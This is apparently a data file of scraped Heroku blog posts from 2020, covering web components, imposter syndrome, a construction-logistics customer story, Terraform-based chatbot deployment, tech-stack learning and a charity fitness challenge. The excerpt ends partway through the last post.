{"website": "Heroku", "title": "Building with Web Components", "author": ["Jamie White"], "link": "https://blog.heroku.com/building-with-web-components", "abstract": "Building with Web Components Posted by Jamie White March 04, 2020 Listen to this article In the early years of web development, there were three standard fundamentals upon which every website was built: HTML, CSS, and JavaScript. As time passed, web developers became more proficient in their construction of fancy UI/UX widgets for websites. With the need for newer ways of crafting a site coming in conflict with the relatively slow adoption of newer standards, more and more developers began to build their own libraries to abstract away some of the technical details. The web ceased being a standard: now your website could be a React site, or an Angular site, or a Vue site, or any number of other web framework that are not interoperable with each other. Web components seek to tilt the balance of web development back towards a standard agreed upon by browser vendors and developers. Various polyfills and proprietary frameworks have achieved what web components are now trying to standardize: composable units of JavaScript and HTML that can be imported and reused across web applications. Let's explore the history of web components and the advantages they provide over third-party libraries. How it all began After some attempts by browser vendors to create a standard—and subsequent slow progress—front-end developers realized it was up to them to create a browser-agnostic library delivering on the promise of the web components vision. When React was released, it completely changed the paradigm of web development in two key ways. First, with a bit of JavaScript and some XML-like syntax, React allowed you to compose custom HTML tags it called components: class HelloMessage extends React.Component {\n  render() {\n    return (\n    <h1>\n        Hello <span class=\"name\">{this.props.name}</span>\n    </h1>\n    );\n  }\n}\n\nReactDOM.render(\n  <HelloMessage name=\"Johnny\" />,\n  document.getElementById('hello-example-container')\n); This trivial example shows how you can encapsulate logic to create React components which can be reused across your app and shared with other developers. Second, React popularized the concept of a virtual DOM . The DOM is your entire HTML document, all the HTML tags that a browser slurps up to render a website. However, the relationship between HTML tags, JavaScript, and CSS which make up a website is rather fragile. Making changes to one component could inadvertently affect other aspects of the site. One of the benefits of the virtual DOM was to make sure that UI updates only redrew specific chunks of HTML through JavaScript events. Thus, developers could easily build websites rendering massive amounts of changing data without necessarily worrying about the performance implications. Around 2015, Google began developing the Polymer Project as a means of demonstrating how they wanted web standards to evolve through polyfills. Over the years and various releases, the ideas presented by Polymer library began to be incorporated by the W3C for standardization and browser adoption. The work started back in 2012 by the W3C (and originally introduced by Alex Russell at Fronteers Conference 2011 ) began to get more attention, undergoing various design changes to address developers' concerns. The web components toolkit Let's take a look at the web standards which make up web components today. Custom elements Custom elements allows you to create custom HTML tags which can exhibit any JavaScript behavior: class SayHello extends HTMLElement {\n  constructor() {\n    super();\n\n    let p = document.createElement(“p”);\n    let text = document.createTextNode(“Hello world!”);\n    p.appendChild(text);\n\n    this.appendChild(p);\n  }\n}\n\ncustomElements.define('say-hello', SayHello); Custom elements can be used to encapsulate logic across your site and reused wherever necessary. Since they're a web standard, you won't need to load an additional JavaScript framework to support them. HTML templates If you need to reuse markup on a website, it can be helpful to make use of an HTML template . HTML templates are ignored by the browser until they are called upon to be rendered. Thus, you can create complicated blocks of HTML and render them instantaneously via JavaScript. To create an HTML template, all you need to do is wrap up your HTML with the new <template> tag: <template id=\"template\">\n  <script>\n    const button = document.getElementById('click-button');\n    button.addEventListener('click', event => alert(event));\n  </script>\n  <style>\n    #click-button {\n    border: 0;\n    border-radius: 4px;\n    color: white;\n    font-size: 1.5rem;\n    padding: .5rem 1rem;\n    }\n  </style>\n  <button id=\"click-button\">Click Me!</button>\n</template> Shadow DOM The shadow DOM is another concept which provides support for further web page encapsulation. Any elements within the shadow DOM are not affected by the CSS styles of any other markup on the page, and similarly, any CSS defined within the shadow DOM doesn't affect other elements. They can also be configured to not be affected by external JavaScript, either. Among other advantages, this results in lower memory usage for the browser and faster render times. If it's helpful, you can think of elements in the shadow DOM as more secure iframe s. To add an element to the shadow DOM, you call attachShadow() on it: class MyWebComponent extends HTMLElement {\n    constructor() {\n        super();\n        this.attachShadow({ mode: \"open\" });\n    }\n    connectedCallback() {\n        this.shadowRoot.innerHTML = `\n            <p>I'm in the Shadow Root!</p>\n        `;\n    }\n}\n\nwindow.customElements.define(\"my-web-component\", MyWebComponent); This creates a custom element, <my-web-component> , whose p tag would not be affected by any other styles on the page. Web component ecosystems The greatest advantage web components have over using a library is their ability to provide standards-compliant, composable HTML elements. What this means is that if you have built a web component, you can package it up as a release for other developers to consume as a dependency in their project, just like any other Node or Ruby package, and those developers can be assured that that web component will work across all (well, most) web browsers without requiring the browser to load a front-end framework like React, Angular, or Vue. To give an example, Shader Doodle is a custom element which sets up the ability to easily create fragment shaders. Developers who need this functionality can just fetch the package and insert it as a <shader-doodle> tag in their HTML, rather than creating the functionality of Share Doodle from scratch. Now, with the great interoperability that web components give you, many frameworks and libraries like Vue or React have started to provide the option to generate web components out of their proprietary code. That way you don't have to learn all the low-level APIs of the aforementioned standards, and can instead focus on coding. There many other libraries for creating web components, like Polymer , X-Tag , slim.js , Riot.js , and Stencil . Another great example of this are Salesforce’s Lightning Web Components , a lightweight framework that abstracts away the complexity of the different web standards. It provides a standards-compliant foundation for building web components which can be used in any project. Getting more involved web components We recorded an episode of Code[ish], our podcast on all things tech, that meticulously went through the history (and future!) of web components . Be sure to check out that interview from someone who literally wrote the book on web components . You can also join the Polymer Slack workspace to chat with other web developers about working with these standards. lwc polymer w3c javascript web components", "date": "2020-03-04,"},
{"website": "Heroku", "title": "\"Do I Qualify?\" And Other Questions Imposters Must Ask Themselves", "author": ["Meg Bednarcik"], "link": "https://blog.heroku.com/questions-imposters-must-ask-themselves", "abstract": "\"Do I Qualify?\" And Other Questions Imposters Must Ask Themselves Posted by Meg Bednarcik March 16, 2020 Listen to this article A word of caution from a former AP Computer Science teacher who, with zero real-world programming experience, quit her dependable teaching gig to become a software engineer: Imposter Syndrome is never late to class. When we grow competent in our craft, yet continue to feel unqualified for our role, that feeling is known as \"Imposter Syndrome.\" The syndrome was with me before I started, it’s here with me now, and it will probably be with me for a long time to come. If you’ve experienced it too, then reading that last sentence may leave you feeling pessimistic, grim even — as if we anticipate a future where we never feel completely worthy of our position in life. But to that, I say: “So what?” We do not control our feelings and we cannot simply \"choose\" to feel worthy, but we can control who we partner with and how we speak to ourselves. This is the story of how I found the perfect sidekick to my career-changing journey — a journey that swallows better people whole. Do you team up? As a computer science student, and then teacher, my software engineering knowledge operated primarily at one level: high . I knew how to write Java, how to sort lists backwards and forwards, and how to bitwise AND an integer, but my knowledge merely served as an example and never lived in production. Imagine writing vaporware for a living — it was kind of like that. But I loved to teach, and still do. I learned an incredible amount simply by expressing my knowledge to younger minds. Learning by teaching, however, has its limits. Several times throughout my tenure as CS teacher, I reached the point of no return. This is the dread of every instructor: the moment a pupil asks a valuable question to which you have no valuable answer. So, unlike many who become software engineers in pursuit of higher earning power, my goal was to pursue a new wealth of wisdom to bring back to my students, wisdom only gained through experience — I needed to walk the walk. From teacher to doer After parting on good terms, I enrolled in a CS master’s program at Georgia Tech , studied for my interviews, and drafted up my resume. To my surprise, things moved too quickly. Despite having just started my transition from teacher to doer , companies clawed at me like I was the last Oreo in the sleeve. However, the enthusiasm was rarely mutual. One after another, high-intensity interviews left me emotionally and mentally exhausted. Whiteboards were beginning to trigger me and daydreams of returning to my life as a teacher danced around my head. But somehow I knew the right opportunity was out there. Fate rewarded my perseverance when I discovered a curious startup named Panorama Education . Panorama Education Panorama provides a specialized data platform for educators. Their tool helps teachers and administrators track metrics of student success, and more importantly, student distress. The product itself was inspiration enough, but a student-focused software company was almost too natural a fit for someone who spent years focusing on her students. I was hooked. However, my limited but emotionally-taxing experience with software interviews prepared me for the worst. I was ready for Panorama to grill me with technical questions, lambast my absent semicolons, and chew me out of the room. I’m grateful and overjoyed to express that none of these occurred. Curious things happen at organizations that target the education market. When these companies align themselves with student outcomes, they adopt internally the same practices which deliver those outcomes; they place a focus on education. During my first interview at Panorama, rather than sit there and judge me as I \"coded\" on a whiteboard, my interviewers joined me on their feet. Two engineers bounced ideas off of me and one another to architect a fictitious web application. The application was fake, but the experience was real — for the first time since leaving my students behind, I felt like a peer of the community I swore to join. The team invited me back for a second interview, one which pressed the education issue further. By this point, I would’ve done three Olympic-worthy backflips to make the cut — and I stretched every night just in case — but in lieu of additional coding exercises or impromptu gymnastics routines, my interviewer expected me to learn. During the interview, I learned git rebase , a topic which lacked immediate appeal. But I trembled with excitement to learn anything of value from a job interview outside of where they kept the good snacks. I paid close attention to the particulars of rebase, and my interviewer challenged me along the way to apply knowledge immediately. And as if this interview lacked originality, at the conclusion I was asked for my opinion. Across several scenarios, would a merge have better communicated my work intent? What price was paid by rebasing onto master rather than merging? Should we change our workflows to avoid rebasing in the future? Why or why not? I was less shocked by the content than I was by the line of questioning. The interviewer absorbed my beliefs on the subject despite me having discovered the technology moments ago. I felt important, needed, and valued. Later, I realized this interview ensured I was capable of learning, adapting to new perspectives, and applying them in my day-to-day. Educating one another would reveal itself as a tenet of Panorama culture, one that ensured my opinion was valued and reminded me that I belonged. Do you qualify? When you’re switching careers to software engineering and you get that first job offer, that  “I’ve made it” moment can be a trojan horse of Imposter Syndrome feelings. I stared at my job offer and wondered aloud, “I’m technically not an engineer, don’t they know that?” On my first day, as I stood in a circle of the company’s latest recruits and prepared to share my name and role with everyone, anxiety swelled my throat. A high-school teacher was about to call herself a software engineer, and the words she needed had ditched class. The inadequacy and not-enoughness that composes Imposter Syndrome may always be present, but these feelings are strongest in moments when we must present ourselves to others. I wanted to say, “Hi, my name is Meg, and I’m a software engineer,” full-stop. Ten words, nary an error among them, simple and honest. But if you’re intimate with Imposter Syndrome, you’re familiar with qualifying your statements. “Hi, my name is Meg, I’m a software engineer … but I used to be a high-school computer science teacher and this is my first time working at a place like this, professionally, err, so yeah, I’m here to learn from you guys and do my best!” I qualify to protect myself, and shock is what I protect myself from. My good friend Tom from college, several faculty and fellow teachers, and every single person in my yoga certification program shouldn’t have much in common, but they all suffered from the same shock. When I told them what I now did for a living, they cocked an eyebrow and repeated my title back to me as if I were the victim of some Freudian slip: “ You’re a software engineer?!” The looks on their faces and tones of their voices combine to what I describe lovingly as the \"Patronized Surprise\" (PS). PS is a look of endearing shock that one might express upon seeing a dog walking on its hind legs, a baby forming a sophisticated political opinion, or you know, a woman writing a conditional statement. People generally mean well, for their surprise conveys a sort of unintentional respect — for me having achieved something beyond their imagination — but their imaginations are the source of my, and many a woman’s, pain. Reactions such as these leave me angry and anxious in anticipation of the next time I’m asked to articulate my role. But rather than confront my patronizers by examining their prejudice, I bury myself further — I qualify, again . I respond in the most sincere way possible with phrases such as, “I can’t believe it either!” or “Yeah, I’m really lucky,” or “Well, I’m still pretty new at it,” and that’s after two years on the job. The flaw in qualifying ourselves is two-fold. First, qualifying yourself reinforces the stereotypes presently entrenched in the other’s mind. The qualification namely seeks to extinguish the explosive brushfire of cognitive dissonance set ablaze by your words. The other hears your job title, your strong opinion, or worse, your objection, and upon processing these statements, your words contort their mind into a mental pretzel; a position they only escape by defying their reality or doubting yours. The latter of the two is the path of least resistance — I’m right and always right, so you must be wrong . By saying things such as, “Well that’s what I read somewhere,” or “But it’s just a silly idea,” you gently nudge a mind teetering on the precipice of change back into its comfort zone. Second, and far more critical to you and I, qualifying ourselves is a self-fulfilling prophecy. Phrases such as, “But I just started, so I’m still learning,” don’t come out of someone else’s mouth, we utter that drivel. The way we speak to ourselves and about ourselves (a process known as self-talk) reinforces what we believe about ourselves as well. If we spend entire workdays qualifying our ideas and roles, why wouldn’t we feel the same level of uncertainty as our mouth-character proclaims? Because ultimately, what we say is what we think. For every qualifying statement I devised, I had to spend equal, if not more brain power undoing the damage and rebuilding my self-image — like having to constantly patch a wall that I insist on karate-punching a hole through. Do you improve? When I joined Panorama, education happened everywhere I looked: between team members during pair-programming sessions, between colleagues during our \"lunchineering\" talks, and more intimately, between fellow female engineers who spotted my self-qualifying speech and wanted to help me put an end to it. They noticed it in person, but saw it more acutely in my messages on Slack. Someone would catch me pre-qualifying my statements with, “I think…,” “Sorry to bother you…,” “Maybe we might want to possibly consider…,” and a host of other filler phrases that required my colleagues to read more words but gain fewer insights. After taking a hard look at this pattern, I came up with a trick that I continue to use today. Before sending off a formal Slack message or an email, I first send it to myself. The sending is key because I need to read my text from the perspective of my recipient, a colleague or peer receiving my message with fresh eyes. After re-reading what I plan to send, I diligently purge all qualifying statements from my paragraphs. Also, keeping in line with self-talk, I re-read it to myself as an affirmation of my skills and confidence before sending it off — no walls to patch here. If what we say truly reflects what we think, then the extra couple minutes we spend editing ourselves before presenting to the world is a highly valuable two minutes. Do you fear the imposter? Earlier, I wrote of keeping Imposter Syndrome with me as a sort of gaudy souvenir, something that I would cling to for years to come. I can’t say for sure if that statement about Imposter Syndrome is a fact, but in stating it, I’m certain I’ve removed its power. Imposter Syndrome is not something to be feared or conquered, it is a series of natural reactions to new responsibilities and roles in which we do not yet feel comfortable. But as so many great thinkers have already shown us: nothing grows in comfort, pressure creates diamonds, and to gain something you’ve never had, you must do something you’ve never done (me, Patton, and Jefferson, respectively). I encourage you to look at Imposter Syndrome not as a source of pain, but as a symptom of personal growth and great things to come. When it rears itself, remember that it is merely a reflection of how you perceive you. Keep it calm by teaming up with people who encourage you to learn, make mistakes, and share your thoughts. Then treat your knowledge with the same respect that you treat others’. I wish you the best of luck on your journey, and may it be as fruitful and life-changing as my own. personal growth imposter syndrome", "date": "2020-03-16,"},
{"website": "Heroku", "title": "Impending Vroom — How Ruckit Will Modernize Construction Right in the Nick of Time", "author": ["Ben Zhang"], "link": "https://blog.heroku.com/modernizing-construction", "abstract": "Impending Vroom — How Ruckit Will Modernize Construction Right in the Nick of Time Posted by Ben Zhang April 07, 2020 Listen to this article Alex Hendricks turns up the radio in the cabin of his ‘91 Ford LT8501. He’s drowning out the noise of the construction crew 100ft ahead as they make progress on a brand new bridge in Waco, Texas. Alex isn’t here to take in the sight of fresh new infrastructure. He’s in his truck waiting for the go-ahead to deliver a payload of hot mastic asphalt to the bridge crew. Alex has a ticket in his hands that needs a sign-off from the project’s contractor — a signature that proves he made his delivery, and on time. Without it, he doesn’t get paid, and the clock is ticking. Each ticket earns him about $60, and missing any of today’s three deliveries will start to make him sweat. His wife, at home with their two-year-old, will start to worry. A technical issue stalls the bridge crew, and the hot asphalt sitting in the bed of Alex’s truck begins to harden. If Alex's truck rests for too long, the asphalt will solidify, then the contractor will lose the materials, the asphalt company blamed, and the project delayed. Alex will have to fess up to his broker, Sascha Novarro, who texted him the night before to see if he could run the asphalt today, and since he needed the cash, to which he replied with an emphatic \"Yes!\". Thankfully, Alex isn’t real. Sascha isn’t real, nor is the bridge project in Waco, nor the contractor about to lose his materials — but the situation they find themselves in occurs every day on thousands of construction sites across the United States. Timing and coordination are paramount between contractors, foremen, material providers, brokers, and their truckers. These parties are often entirely independent of each other. They form a micro-gig economy that’s been around long before Uber was an idea, and they struggle to coordinate the daily logistics required to achieve their goals. The \"endless\" highway construction project you’re stuck commuting through daily is built on problems of fraud and inefficiency in the workflow, problems that software company Ruckit tackles every day. As digital transformations revitalize labor-intensive processes across all industry sectors, opportunities such as trucking, those that pose \"too big of a lift,\" go ignored — but not by Ruckit. In 2018, Ruckit launched a comprehensive platform targeting the construction industry, one of the nation’s un-techiest sectors. The lack of a digital ticketing system, of instant coordination between parties, of real-time logistics, and of fraud-prevention mechanisms all helped trucking become a 40% line-item on the budget for any given construction project. This is the problem Ruckit solves every day, and they’re pretty much doing it solo. Construction obstruction The key challenge in bringing this century’s technical advancements to trucking has little to do with technology and everything to do with the guy in the driver’s seat. Ruckit discovered that within a given horizontal construction project (bridge, road, highway, railroad, airfield, and similar), each requires the cooperation of approximately 16 unique, and often independent, personas. These range from the project manager to the back-office accountants to the contractor, foremen, broker, material provider, and of course, the trucker. It was insufficient to digitize any one aspect of construction without digitizing the lot — one missing link in the chain forces all parties into a two-process system (blending the old with the new, and thereby multiplying the logistics). While Ruckit encountered few objections when prescribing their digital panacea to accountants and college-educated project managers, blue-collar truckers had one major hang-up: “What’s in it for me?” Michael Bordelon, CTO of Ruckit, notes the company found success by satisfying the unique needs of every player along the construction pipeline. Scoping and bifurcating the product experience to enable each individual persona proved a critical decision. For the simple trucker trying to make ends meet, a full digital transformation proved a much tougher sell than most technologists would assume. Paper tickets make perfect sense to truckers; they meant dollars and cents. These tickets are money they hold in the palms of their hands, not promises of cash from \"the cloud.\" The cloud is hard to understand, and the paper in their hands, not so much. Rather than fight an uphill battle, Ruckit knew the best way forward was to meet the market where it was. Without turning each trucker’s world into a series of zeroes and ones, Ruckit digitized their contributions and folded them into the bigger system without alienating them or talking down to them. They achieved this by releasing a mobile app that allows truckers to scan their paper tickets and take photos of their trucks on-site to verify deliveries. To entice the independent trucker to adopt the software, the app integrates the entire project pipeline (including backend accounting) to notify the trucker when their brokers submit an invoice for their tickets, when the invoice pays out, and when the trucker can expect money in their bank. Beyond that, by integrating every animal along the construction food chain, truckers can receive and accept jobs from a single interface without going back-and-forth in phone calls and text messages. And Ruckit achieved all of this without inventing anything new. \"We’re not inventing any new tech.\" — Michael Bordelon, CTO, Ruckit Building for the future Michael admits, emphatically, that Ruckit did not set out to reinvent any tech wheels — all the parts needed to construct and provide their multi-tenant platform showed up turn-key and powerful right out of the box. From custom mapping tools that help trucks avoid traffic violations and comply with city ordinances, to the AI-enabled OCR (optical character recognition) used to digitize photographs of paper tickets, Ruckit applies best practice and open source tooling to deliver immense value to this underserved market. The Heroku platform makes it easy for Michael and his team to embed new technology into their Ruby on Rails and Django environments. For example, Ruckit applies machine learning to several layers of their application, one of which helps schedule deliveries to maximize efficiency and circumvent traffic flow — technology that came off the shelf now saves their customers tens of thousands of dollars per year. Cost savings compound when every player on the scene aligns on the Ruckit platform, which happens to be Ruckit’s vision for the future of construction. Over the next decade, Ruckit plans to inspire trust among truckers, a level of trust sufficient to convince them to switch to a purely digital ecosystem — \"go paperless,\" if you will. By receiving, delivering, and tracking all payloads digitally, Ruckit will have removed the last paper trail holdouts in the construction world. With a pure digital system, Ruckit expects a significant reduction in human error and in delays resulting from the digitization of paper tickets. That’s their long game, and as of March 2020, the month which saw the dawn on a COVID-19 America, Ruckit is plowing full steam ahead. Certainly uncertain Michael approaches the near-term future with trepidation, yet also with optimism. He notes that in times of recession, as those we can expect in the coming years, the construction industry fairs better than most. It is in dire times such as these that governments unlock additional funds to improve infrastructure and push planned public works forward — as a consequence, they put millions of people to work on job sites. While Ruckit may not be at the center of every project, Michael continues to field two sales calls per day to handle the immense interest in the Ruckit platform. As our country, and the world at large, begin to recover from the personal and economical impacts of the COVID-19 virus, platforms such as Ruckit will be there to help coordinate the human effort which defines us as a civilized people: building. “You can’t off-shore construction, and you can’t fake a bridge.\" — Michael Bordelon, CTO, Ruckit With that, Michael enlightens a long-held perspective on construction as an \"unsexy\" industry. In reality, whether we’re constructing the information superhighway or the regular kind, we’re still building. In either scenario, we come together as people to create beneficial structures for society. Without new and remodeled roads, highways, bridges, and beyond, the network of travel which modern life relies upon goes unmaintained. Without a system to organize the disparate efforts required, we shed efficiency and precious resources along the way. Much like Ruckit helps construction projects focus on the deliverables, Heroku helps Ruckit focus on value. Heroku as a utility “When you open an office,” Michael reminds, “you don’t buy your own generator, pump it with gas, and plug in your desk lamp. You rely on the power grid. Same goes for our tech.” With Heroku, Ruckit is happy to do away with managing remote servers, load-balancing, uptime, and a host of DevOps tasks that otherwise require complete commitment from specialized employees. “If there’s a usage spike, we spin up a couple more dynos, and that costs me an extra latte,” he smiles. With Heroku on the backend, Ruckit in the middle, and a host of construction professionals at the frontlines, together we offer a trickle-down efficiency that benefits all parties — it’s a win-win-win. “I don’t want my team busy wasting resources on DevOps. I want them focused on delivering functionality and value to our end users. Heroku enables that, and I’m never going back.” — Michael Bordelon, CTO, Ruckit With Heroku powering Ruckit, and Ruckit powering more of the country’s construction efforts, we can expect a marvelous surge of efficiency and throughput from an industry that was long overdue for a high-tech makeover. Read the Ruckit case study to learn more about how Michael and team built Ruckit on Heroku. digital transformations construction", "date": "2020-04-07,"},
{"website": "Heroku", "title": "Building and Scaling a Global Chatbot using Heroku + Terraform", "author": ["Garen Torikian"], "link": "https://blog.heroku.com/chatbots-with-heroku-terraform", "abstract": "Building and Scaling a Global Chatbot using Heroku + Terraform Posted by Garen Torikian April 22, 2020 Listen to this article Text-based communication has a long history weaved into the evolution of the Internet, from IRC and XMPP to Slack and Discord. And where there have been humans, there have also been chatbots: scriptable programs that respond to a user’s commands, like messages in a chat room. Chatbots don't require much in terms of computational power or disk storage, as they rely heavily on APIs to send actions and receive responses. But as with any kind of software, scaling them to support millions of user’s requests across the world requires a fail-safe operational strategy. Salesforce offers a Live Agent support product with a chatbot integration that reacts to customer inquiries. In this post, we'll take a look at how the team uses Heroku for their chatbot's multi-regional requirements. How users interact with the chatbot Live Agent is an embeddable chatbot that can be added to any website or mobile app. Users can engage in a conversation with the chatbot, asking questions and performing actions along the way. For example, if a bank customer wants to learn how to set up two-factor authentication, they could ask the chatbot for guidance, rather than call the bank directly. The aim of Live Agent is to augment a human support agent's capabilities for responding to events that happen at a high scale. Because everybody learns and interacts a little bit differently, it's advantageous to provide help through various mediums, like videos and documentation. Chatbots offer another channel, with guided feedback that offers more interactive information. Rather than providing a series of webpages with static images, a chatbot can make processes friendlier by confirming to users their progress as they go through a sequence of steps. Live Agent hooks into Apex , a Java-like programming language that is tied directly into Salesforce's object models, allowing it to modify and call up CRM records directly. You can also have a Live Agent chatbot call out to any API and pretty much do anything on the web. With their open-ended nature, chatbots can perform endless operations across a variety of communication platforms. Facebook Messenger, for example, is the third most popular app in the world , and you could have a Live Agent backend running on the Messenger platform to respond to user queries. Running Live Agent on Heroku With such a large scope across disparate mediums, there's a significant number of requests coming into Live Agent chatbots and vast amounts of data they can access. It may surprise you to learn that there are only eight engineers responsible for running Live Agent! In addition to coding the features, they own the entire product. This means that they are also responsible for being on-call for pager rotations and ensuring that the chatbots can keep up with incoming traffic. The small team didn't want to waste time configuring their platform to run on bare metal or on a cloud VM, and they didn't want the administrative overhead of managing databases or other third-party services. Since Salesforce customers reside all over the world, the Live Agent chatbots must also be highly available across multiple regions. The Live Agent team put its trust into Heroku to take care of all of those operational burdens. Heroku already manages millions of Postgres databases for our customers, and we have a dedicated staff to manage backups, perform updates, and respond to potential outages. The Live Agent chatbot runs on Java, and Heroku's platform supports the entire Java ecosystem, with dedicated Java experts to handle language and framework updates, providing new features and responding to security issues. In order to serve their customers worldwide, the core Live Agent infrastructure matches Heroku's availability in every region around the world . All of their services are managed by Heroku, ensuring that their Heroku Postgres, Redis, and Apache Kafka dependencies are blazing fast no matter where a request comes from. The beauty of it all is how simple it is to scale, without any of Live Agent's team needing to be responsible for any of the maintenance and upkeep. Leveraging Terraform for replication and Private Spaces for security The Live Agent platform is comprised of ten separate apps, each with their own managed add-ons and services. To fully isolate the boundaries of communication, the collection of apps are deployed into a Heroku Private Space . Private Spaces establish an isolated runtime for the apps to ensure that the data contained within the network is inaccessible from any outside service. Private Spaces are available in a variety of regions; if a new region becomes available, the Live Agent team wanted to be able to automatically redeploy the same apps and add-ons there. And if they ever need to create a new app, they also wanted to add it to all of the Private Spaces in those geographic locations. To easily replicate their architecture, the Live Agent team uses Terraform to automate deployment and configuration of the Live Agent platform. Terraform is the driver behind everything they do on Heroku. With it, they can explicitly and programmatically define their infrastructure--the apps and add-ons, custom domains, and logging and profiling setup--and have it securely available in any region, instantly. Whenever a new configuration is necessary, they can implement that update with just a few lines of code and make it live everywhere with the merge of a pull request. For example, to automatically set up a Node.js Heroku app that requires a Postgres database and logging through Papertrail , a Terraform config file might just look something like this: resource \"heroku_app\" \"server\" {\n  name = \"my-app\"\n  region = \"us\"\n\n\n  provisioner \"local-exec\" {\n    command = \"heroku buildpacks:set heroku/nodejs --app ${heroku_app.server.name}\"\n  }\n}\n\nresource \"heroku_addon\" \"database\" {\n  app  = \"${heroku_app.server.name}\"\n  plan = \"heroku-postgresql:hobby-dev\"\n}\n\n# Papertrail addon (for logging)\n\nresource \"heroku_addon\" \"logging\" {\n  app = \"${heroku_app.server.name}\"\n  plan = \"papertrail:choklad\"\n} Here are some details on how to use Terraform with Heroku . Learning more If you'd like to learn more about how Live Agent uses Heroku to scale their platform, our podcast Code[ish], has an interview with their team , where they dive into more of the technical specifics. We also have not one but two posts on dev.to listing all the DevOps chores which Heroku automatically takes care of for you. terraform chatbot", "date": "2020-04-22,"},
{"website": "Heroku", "title": "Evolving Alongside your Tech Stack", "author": ["Chris Castle"], "link": "https://blog.heroku.com/evolving-alongside-tech-stack", "abstract": "Evolving Alongside your Tech Stack Posted by Chris Castle April 29, 2020 Listen to this article This blog post is adapted from a discussion during an episode of our podcast, Code[ish] . Over the last twenty years, software development has advanced so rapidly that it's possible to create amazing user experiences, powerful machine learning algorithms, and memory efficient applications with incredible ease. But as the capabilities tech provides has changed, so too have the requirements of individual developers morphed to encompass a variety of skills. Not only should you be writing efficient code; you need to understand how that code communicates with all the other systems involved and make it all work together. In this post, we'll explore how you can stay on top of the changing software development landscape, without sacrificing your desires to learn or the success of your product. User experience depends on technical expertise When the iPhone first came out in 2007, it was rather limited in technical capabilities. There was no support for multitasking and gestures, no ability to copy and paste text, and there wasn't any support for third-party software. It's not that these ideas were not useful, it’s just that the first generation of the phone's hardware and operating system could not support such features. This serves as a good example to underscore how UX has sometimes been constrained by technology. Now, the situation has changed somewhat. Tools have advanced to the point where it's really easy to create a desktop or mobile app which accepts a variety of gestures and inputs. The consequences of this are twofold. First, users have come to expect a certain level of quality in software. Gone are the days of simply \"throwing something together\"; software, websites, and mobile apps all need to look polished. This requires developers to have a high level of design sensibility (or work with someone else who does). Second, it means that the role of the engineer has expanded beyond just writing code. They need to understand why they're building whatever it is they're building, why it's important to their users, and how it functionally integrates with the rest of the app. If you design an API, for example, you’ll need to secure it against abuse; if you design a custom search index, you need to make sure users can actually find what they’re looking for. On the one hand, because you're running on the same devices and platforms as your users (whether that a smartphone or an operating system), you're intricately familiar with the best UI patterns—how a button should operate, which transitions to make between screens—because every other app has made similar considerations. But on the other hand, you also need to deal with details such as memory management and CPU load to ensure the app is running optimally. It’s not enough for an app to work well, as it must also look good. It's important to find a balance of both design sensibilities and technical limitations—or at least, a baseline knowledge of how everything works—in order to ship quality software. Follow everything but only learn some things When it comes to personal growth, learning to prioritize solutions to the problems you encounter can be critical in your development. For example, suppose you notice one day that your Postgres queries are executing slower than you would like. You should have a general awareness of how higher rates of traffic affects your database querying strategies, or how frequent writes affect the physical tables on disk. But that doesn't necessarily mean that you should sink a massive amount of time and effort to fine-tune these issues towards the most optimal strategy. When developing software, you will always have one of several choices to make, and rarely does one become the only true path forward. Sometimes, having the insight to know the trade-offs and accepting one sub-optimal approach above another makes it easier to cut losses and focus on the parts of your software which matter. Sometimes, having the insight to know the trade-offs and accepting one sub-optimal approach above another makes it easier to cut losses and focus on the parts of your software which matter. It seems like every year, a new web framework or programming language is released. This makes it difficult, if not impossible, to follow every single new item when they are announced. The inverse is also true. We might feel that adopting new technologies is one way to stay \"relevant,\" but this attitude can be quite dangerous. If you are an early adopter, you run the risk of being on the hook for finding bugs, distracting you from your actual goal of shipping features for your own application. You should take a calculated approach to the pros and cons of any new tech. For example, switching your database entirely to MemSQL because you heard it's \"faster\" is less reasonable than making a switch after reading someone's careful evaluation of the technology, and realizing that it matched your own needs as well. Keeping calm and steady At the end of the day, you should be very invested in your own stack and the ecosystem you work in. That work can be something as simple as reading Medium posts or following Twitter accounts. Broaden your knowledge of other services outside your own realm of expertise only if you come across someone confronting problems similar to yours. You should own tools which you know how to operate, rather than keep a shed full of all sorts of shiny objects.", "date": "2020-04-29,"},
{"website": "Heroku", "title": "A True Win-Win: How Being More Active Can Help Fight Malnutrition", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/be-more-active-fight-malnutrition", "abstract": "A True Win-Win: How Being More Active Can Help Fight Malnutrition Posted by Sally Vedros April 30, 2020 Listen to this article The other day, I was sitting at my work desk feeling too sedentary, too isolated, and altogether too down about my restricted life during this coronavirus pandemic. Then, an email popped into my inbox from one of my favorite Heroku customers. Active for Good was announcing their latest activity challenge starting on May 1st . Every minute of exercise during the month of May counts towards unlocking lifesaving meals for malnourished kids. If there was ever a reason to get my sorry butt up out of my chair, this was it! Food as prescribed medicine To start with, Active for Good is easy to love. It’s a sister organization of MANA Nutrition , a nonprofit that manufactures ready-to-use therapeutic food for children suffering from severe acute malnutrition. Kids receiving MANA treatment range from six months to about six years and are located across Africa, as well as in parts of Southeast Asia, Central America, and even North Korea. It goes without saying that most malnourished children in the developing world don’t have access to a hospital bed with a feeding tube. “MANA” stands for “Mother Administered Nutritive Aid,” and their meal packets are designed to allow a mother to feed her child at home in any environment. No refrigeration, cooking, or even water is needed — meals are based on a type of peanut butter that’s been supercharged with all the micronutrients needed to bring a child back from the brink of starvation. Over the past 10+ years, this type of therapy has become the standard of care for the World Food Programme, UNICEF, USAID, and similar agencies. The results are impressive. After completing six weeks of MANA therapy, over 95% of children treated never return to their previous level of malnutrition. Today, nearly 20 million children are in desperate need of treatment. So, how can one person make a difference? It turns out, anyone can help simply by being active. Scaling empathy and connection MANA was founded in 2009. Once operations were up and running smoothly, the MANA team wanted to extend their vision. How could they connect their cause to people in North America who had the opposite problem? Could they somehow help people in the developed world fight obesity and raise awareness of global malnutrition at the same time? In 2014, Active for Good was born as a project to bridge these two worlds. Says co-founder Troy Hickerson: “Our goal is to help both sides of the health equation. We're getting fit, kids are getting fed, and everyone wins.” For the team at Active for Good, their focus is not just about helping people stay fit or lose weight. Nor is it all about encouraging people to help end a humanitarian crisis. It’s about what lies underneath the two that creates the true bridge between them. “We’re interested in the impact of scaling empathy and connection,” says Hickerson, “and we wonder how different the world would be if we had more of it.” These powerful feelings can improve our own lives and communities in innumerable ways and lead to a sense of purpose. When it comes to getting more exercise, purpose can be a powerful motivator. It can also shift the attention away from our own (sometimes shame-based) personal narratives. These days, I’m sure I’m not the only one telling myself I’m getting “pudgy” (to put it mildly). Burn a calorie, contribute a calorie Active for Good drives its mission primarily through time-based activity challenges. Each 